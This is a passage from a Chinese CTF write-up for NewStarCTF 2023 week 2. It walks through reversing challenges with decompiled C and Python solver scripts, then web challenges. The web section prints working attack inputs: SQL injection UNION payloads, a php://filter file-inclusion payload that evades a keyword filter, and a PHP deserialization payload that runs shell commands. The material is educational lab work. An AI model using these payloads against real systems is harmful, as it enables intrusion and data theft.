<span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  __int64 s2[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+40h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+50h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+58h] [rbp-48h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+68h] [rbp-38h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+70h] [rbp-30h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+78h] [rbp-28h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s2[<span class="number">0</span>] = <span class="number">0x3513AB8AB2D7E6EE</span>LL;</span><br><span class="line">  s2[<span class="number">1</span>] = <span class="number">0x2EEDBA9CB9C97B02</span>LL;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="number">0x16E4F8C8EEFA4FBD</span>LL;</span><br><span class="line">  s2[<span class="number">3</span>] = <span class="number">0x383014F4983B6382</span>LL;</span><br><span class="line">  s2[<span class="number">4</span>] = <span class="number">0xEA32360C3D843607</span>LL;</span><br><span class="line">  s2[<span class="number">5</span>] = <span class="number">42581LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can You Find the Secret?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your flag&quot;</span>);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">42</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = s[i];</span><br><span class="line">    v4 = rand();</span><br><span class="line">    s[i] = Table[(<span class="number">16</span> * ((<span class="type">unsigned</span> __int8)(v3 + v4 % <span class="number">255</span>) &gt;&gt; <span class="number">4</span>) + <span class="number">15</span>) &amp; (<span class="type">unsigned</span> __int8)(v3 + v4 % <span class="number">255</span>)];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(s, s2, <span class="number">0x2A</span>uLL) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You get the Right Flag!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Maybe your flag is Wrong o.O?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现在调用主函数前还设置了随机数种子<code>0x5377654E</code></p><img src="/posts/843a2f5ea22b/image-20231006130557199.png" class="" title="image-20231006130557199"><p>使用以下python脚本获取数组Table的元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">bytes_addr = <span class="number">0x4020</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    data = get_bytes(bytes_addr+i,<span class="number">1</span>)</span><br><span class="line">    a.append(<span class="built_in">ord</span>(data))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>编写如下解题脚本，由于此处是小端存储，所有取s2的元素时需要倒着取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s2=<span class="string">&#x27;3513AB8AB2D7E6EE2EEDBA9CB9C97B0216E4F8C8EEFA4FBD383014F4983B6382EA32360C3D843607A655&#x27;</span></span><br><span class="line">Table = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">199</span>, <span class="number">35</span>, <span class="number">195</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">5</span>, <span class="number">154</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, <span class="number">235</span>, <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">131</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">110</span>, <span class="number">90</span>, <span class="number">160</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">41</span>, <span class="number">227</span>, <span class="number">47</span>, <span class="number">132</span>, <span class="number">83</span>, <span class="number">209</span>, <span class="number">0</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, <span class="number">190</span>, <span class="number">57</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">69</span>, <span class="number">249</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">159</span>, <span class="number">168</span>, <span class="number">81</span>, <span class="number">163</span>, <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>, <span class="number">56</span>, <span class="number">245</span>, <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>, <span class="number">61</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">115</span>, <span class="number">96</span>, <span class="number">129</span>, <span class="number">79</span>, <span class="number">220</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">144</span>, <span class="number">136</span>, <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">219</span>, <span class="number">224</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, <span class="number">172</span>, <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>, <span class="number">55</span>, <span class="number">109</span>, <span class="number">141</span>, <span class="number">213</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, <span class="number">174</span>, <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>, <span class="number">37</span>, <span class="number">46</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>, <span class="number">62</span>, <span class="number">181</span>, <span class="number">102</span>, <span class="number">72</span>, <span class="number">3</span>, <span class="number">246</span>, <span class="number">14</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">87</span>, <span class="number">185</span>, <span class="number">134</span>, <span class="number">193</span>, <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>, <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>, <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">223</span>, <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>, <span class="number">66</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">153</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">176</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">22</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">libc =cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">srand = libc.srand(<span class="number">0x5377654E</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    v4 = libc.rand()</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        temp = m+v4%<span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span>(temp&gt;<span class="number">255</span>):</span><br><span class="line">            temp -= <span class="number">256</span></span><br><span class="line">        s = Table[(<span class="number">16</span>*(temp&gt;&gt;<span class="number">4</span>)+<span class="number">15</span>)&amp;temp]</span><br><span class="line">        <span class="keyword">if</span> s == <span class="built_in">int</span>(s2[(<span class="number">16</span>*(i//<span class="number">8</span>))+<span class="number">14</span>-(i%<span class="number">8</span>)*<span class="number">2</span>:(<span class="number">16</span>*(i//<span class="number">8</span>))+<span class="number">14</span>-(i%<span class="number">8</span>)*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    v4 = libc.rand()</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        temp = m + v4 % <span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (temp &gt; <span class="number">255</span>):</span><br><span class="line">            temp -= <span class="number">256</span></span><br><span class="line">        s = Table[(<span class="number">16</span> * (temp &gt;&gt; <span class="number">4</span>) + <span class="number">15</span>) &amp; temp]</span><br><span class="line">        <span class="keyword">if</span> s == <span class="built_in">int</span>(s2[<span class="number">82</span>-i*<span class="number">2</span>:<span class="number">82</span>-i*<span class="number">2</span>+<span class="number">2</span>], <span class="number">16</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231006151350574.png" class="" title="image-20231006151350574"><h3 id="easy-enc"><a href="#easy-enc" class="headerlink" title="easy_enc"></a>easy_enc</h3><p>打开可执行文件测试一下，得到主函数输出的字符</p><img src="/posts/843a2f5ea22b/image-20231006152948338.png" class="" title="image-20231006152948338"><p>在IDA里搜索文本，找到主函数</p><p>反编译源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_140016070</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">9</span>]; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">132</span>]; <span class="comment">// [rsp+70h] [rbp+50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+F4h] [rbp+D4h]</span></span><br><span class="line">  <span class="type">char</span> Buf1[<span class="number">5</span>]; <span class="comment">// [rsp+120h] [rbp+100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">127</span>]; <span class="comment">// [rsp+125h] [rbp+105h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1A4h] [rbp+184h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">106</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_14001135C(&amp;unk_140021018);</span><br><span class="line">  v5[<span class="number">0</span>] = (__int64)sub_1400113C5;</span><br><span class="line">  v5[<span class="number">1</span>] = (__int64)sub_1400113CA;</span><br><span class="line">  v5[<span class="number">2</span>] = (__int64)sub_1400113F2;</span><br><span class="line">  v5[<span class="number">3</span>] = (__int64)sub_1400113ED;</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="number">0x64</span>ui64);</span><br><span class="line">  sub_14001118B(<span class="string">&quot;Input Your flag(format:A-Z a-z): &quot;</span>);</span><br><span class="line">  sub_1400113FC(&amp;unk_140019C18, Str);</span><br><span class="line">  dword_14001C17C = j_strlen(Str);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))v5[j])(Str);</span><br><span class="line">  Buf1[<span class="number">0</span>] = <span class="number">-24</span>;</span><br><span class="line">  Buf1[<span class="number">1</span>] = <span class="number">0x80</span>;</span><br><span class="line">  Buf1[<span class="number">2</span>] = <span class="number">-124</span>;</span><br><span class="line">  Buf1[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">  Buf1[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v9, <span class="string">&quot;&lt;xh&quot;</span>);</span><br><span class="line">  v9[<span class="number">4</span>] = <span class="number">112</span>;</span><br><span class="line">  v9[<span class="number">5</span>] = <span class="number">124</span>;</span><br><span class="line">  v9[<span class="number">6</span>] = <span class="number">-108</span>;</span><br><span class="line">  v9[<span class="number">7</span>] = <span class="number">-56</span>;</span><br><span class="line">  v9[<span class="number">8</span>] = <span class="number">-32</span>;</span><br><span class="line">  v9[<span class="number">9</span>] = <span class="number">16</span>;</span><br><span class="line">  v9[<span class="number">10</span>] = <span class="number">-20</span>;</span><br><span class="line">  v9[<span class="number">11</span>] = <span class="number">-76</span>;</span><br><span class="line">  v9[<span class="number">12</span>] = <span class="number">-84</span>;</span><br><span class="line">  v9[<span class="number">13</span>] = <span class="number">104</span>;</span><br><span class="line">  v9[<span class="number">14</span>] = <span class="number">-88</span>;</span><br><span class="line">  v9[<span class="number">15</span>] = <span class="number">12</span>;</span><br><span class="line">  v9[<span class="number">16</span>] = <span class="number">28</span>;</span><br><span class="line">  v9[<span class="number">17</span>] = <span class="number">-112</span>;</span><br><span class="line">  v9[<span class="number">18</span>] = <span class="number">-52</span>;</span><br><span class="line">  v9[<span class="number">19</span>] = <span class="number">84</span>;</span><br><span class="line">  v9[<span class="number">20</span>] = <span class="number">60</span>;</span><br><span class="line">  v9[<span class="number">21</span>] = <span class="number">20</span>;</span><br><span class="line">  v9[<span class="number">22</span>] = <span class="number">-36</span>;</span><br><span class="line">  v9[<span class="number">23</span>] = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v9[<span class="number">24</span>], <span class="number">0</span>, <span class="number">0x47</span>ui64);</span><br><span class="line">  v10 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !j_memcmp(Buf1, Str, dword_14001C17C) )</span><br><span class="line">    sub_14001118B(<span class="string">&quot;Right!! flag is flag&#123;your input&#125;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_14001118B(<span class="string">&quot;Wrong!!\n&quot;</span>);</span><br><span class="line">  sub_1400112F3(v3, &amp;unk_14001AA10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入的str进行了4次加密</p><p>使用正向爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Buf1 = [<span class="number">0xE8</span>,<span class="number">0x80</span>,<span class="number">0X84</span>,<span class="number">8</span>,<span class="number">0X18</span>,<span class="number">0X3C</span>,<span class="number">0X78</span>,<span class="number">0X68</span>,<span class="number">0</span>,<span class="number">0X70</span>,<span class="number">0X7C</span>,<span class="number">0X94</span>,<span class="number">0XC8</span>,<span class="number">0XE0</span>,<span class="number">0X10</span>,<span class="number">0XEC</span>,<span class="number">0XB4</span>,<span class="number">0XAC</span>,<span class="number">0X68</span>,<span class="number">0XA8</span>,<span class="number">0X0C</span>,<span class="number">0X1C</span>,<span class="number">0X90</span>,<span class="number">0XCC</span>,<span class="number">0X54</span>,<span class="number">0X3C</span>,<span class="number">0X14</span>,<span class="number">0XDC</span>,<span class="number">0X30</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;NewStarCTF&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Buf1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">        c = <span class="built_in">ord</span>(j)</span><br><span class="line">        <span class="keyword">if</span> c&gt;=<span class="number">97</span> <span class="keyword">and</span> c&lt;=<span class="number">0x7A</span>:</span><br><span class="line">            c = (c-<span class="number">89</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">        <span class="keyword">elif</span> c&gt;=<span class="number">48</span> <span class="keyword">and</span> c&lt;=<span class="number">57</span>:</span><br><span class="line">            c = (c-<span class="number">45</span>)%<span class="number">10</span> +<span class="number">48</span></span><br><span class="line">        <span class="keyword">elif</span> c &gt;= <span class="number">65</span> <span class="keyword">and</span> c &lt;= <span class="number">90</span>:</span><br><span class="line">            c = (c - <span class="number">52</span>)%<span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        c += <span class="built_in">ord</span>(<span class="built_in">str</span>[i%<span class="number">10</span>])</span><br><span class="line">        c = ~c +<span class="number">256</span></span><br><span class="line">        c = (c*<span class="number">52</span>)%<span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span>(c == Buf1[i]):</span><br><span class="line">            flag+=j</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><img src="/posts/843a2f5ea22b/image-20231006204714402.png" class="" title="image-20231006204714402"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>JS代码中找到游戏目标</p><img src="/posts/843a2f5ea22b/image-20231002002527135.png" class="" title="image-20231002002527135"><p>在本地覆盖js代码，胜利目标改为100，传给后端的分数也改为1000000</p><p><img src="G:/CTF/CTF题目文件/NewStarCTF2023/WEEK2/img/image-20231002015315171.png" alt="image-20231002015315171"></p><p>得到flag<code>flag&#123;c82f9d84-d2a4-43c1-93bb-39a81cae9c91&#125;</code></p><img src="/posts/843a2f5ea22b/image-20231002020913855.png" class="" title="image-20231002020913855"><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>测试<code>TMP11503&#39; and 1=1 -- qwe</code>发现有回显，说明存在注入点</p><p><code>TMP11503&#39; and 1=1 -- qwe</code>，显示NO</p><p>而<code>TMP11503&#39; AND 1=1 -- qwe</code>，显示正常</p><p>说明对大小写敏感</p><p>判断字段数，直到<code>TMP11503&#39; ORDER BY 6 -- qwe</code>才无回显，说明一共5个字段</p><img src="/posts/843a2f5ea22b/image-20231002011855619.png" class="" title="image-20231002011855619"><p>页面正好显示5个数据，说明都是数据显示位</p><p>开始爆表</p><p><code>-1&#39; UNION SELECT 1,2,3,4,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1 -- QWE</code></p><img src="/posts/843a2f5ea22b/image-20231002012902311.png" class="" title="image-20231002012902311"><p>存在一个<code>here_is_flag</code>表</p><p>剩下工作交给sqlmap了</p><img src="/posts/843a2f5ea22b/image-20231002014335532.png" class="" title="image-20231002014335532"><h3 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>过滤了base和rot字符串，即无法使用base64和rot13的编码方式</p><p>那就用UCS-2方式</p><p>payload为<code>?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</code></p><p>使用burp抓包得到flag的编码</p><img src="/posts/843a2f5ea22b/image-20231002231951159.png" class="" title="image-20231002231951159"><p>本地编写脚本解码</p><img src="/posts/843a2f5ea22b/image-20231002232957110.png" class="" title="image-20231002232957110"><h3 id="Unserialize"><a href="#Unserialize" class="headerlink" title="Unserialize?"></a>Unserialize?</h3><p>反序列化的题目</p><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的后门在析构函数</p><p>如果构造的序列化字符串成功反序列化成一个<code>evil</code>类的对象，那么在析构函数中的代码将会被执行</p><p>先传个ls命令试试：<code>O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code></p><img src="/posts/843a2f5ea22b/image-20231002235008331.png" class="" 